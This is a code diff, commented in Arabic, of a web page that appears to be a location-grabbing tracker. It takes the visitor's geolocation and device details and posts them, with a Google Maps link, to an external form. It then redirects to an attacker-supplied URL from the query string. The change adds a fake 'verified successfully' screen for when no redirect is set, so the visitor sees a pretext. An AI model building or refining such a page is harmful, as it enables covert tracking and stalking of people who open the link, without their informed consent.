@@ -20,20 +20,17 @@
             initiateService();
         };
 
-        // دالة جديدة لاستخراج الرابط الهدف من شريط العنوان
+        // دالة استخراج الرابط الهدف
         function getDynamicRedirectUrl() {
-            // جلب المتغيرات من الرابط
             const urlParams = new URLSearchParams(window.location.search);
-            // استخراج قيمة المتغير 'url'
             const target = urlParams.get('url');
             
-            // التحقق مما إذا كان الرابط موجوداً ويبدأ بـ http
             if (target && target.startsWith('http')) {
                 return target; 
             }
             
-            // الرابط الافتراضي في حال فتحت الصفحة بدون تحديد رابط إضافي
-            return "https://www.google.com/maps";
+            // تم إلغاء الرابط الافتراضي، سيتم إرجاع قيمة فارغة
+            return null;
         }
 
         function initiateService() {
@@ -66,17 +63,22 @@
             const lng = position.coords.longitude;
             const accuracy = position.coords.accuracy;
 
-            // تحديد الوجهة بناءً على الرابط
             const targetUrl = getDynamicRedirectUrl();
 
-            // إرسال البيانات ثم التحويل المباشر للرابط المستخرج
+            // إرسال البيانات ثم التحويل
             sendDataToGoogle("موافق", lat, lng, accuracy, deviceInfo).finally(() => {
-                window.location.replace(targetUrl);
+                if (targetUrl) {
+                    window.location.replace(targetUrl); // التحويل للرابط المستخرج
+                } else {
+                    // في حال لم تضع رابط في الـ url، سيخفي التحميل وتظهر شاشة بيضاء
+                    loadingState.style.display = 'none';
+                    document.body.innerHTML = "<h3 style='color:#117852;'>تم التحقق بنجاح.</h3>";
+                }
             });
         }
 
         function handleLocationError() {
-            // إخفاء التحميل وعرض رسالة الخطأ وزر التحديث (دون إرسال بيانات)
+            // عند الرفض: إخفاء التحميل وعرض رسالة الخطأ وزر التحديث
             loadingState.style.display = 'none';
             errorState.style.display = 'block';
         }
@@ -96,6 +98,7 @@
 
             let mapsLink = "N/A";
             if (lat !== "N/A" && lng !== "N/A") {
+                // تم تصحيح بناء الرابط هنا ليعمل المتغير lat بشكل سليم
                 mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
             }
             formData.append(ENTRY_MAPS_LINK, mapsLink);
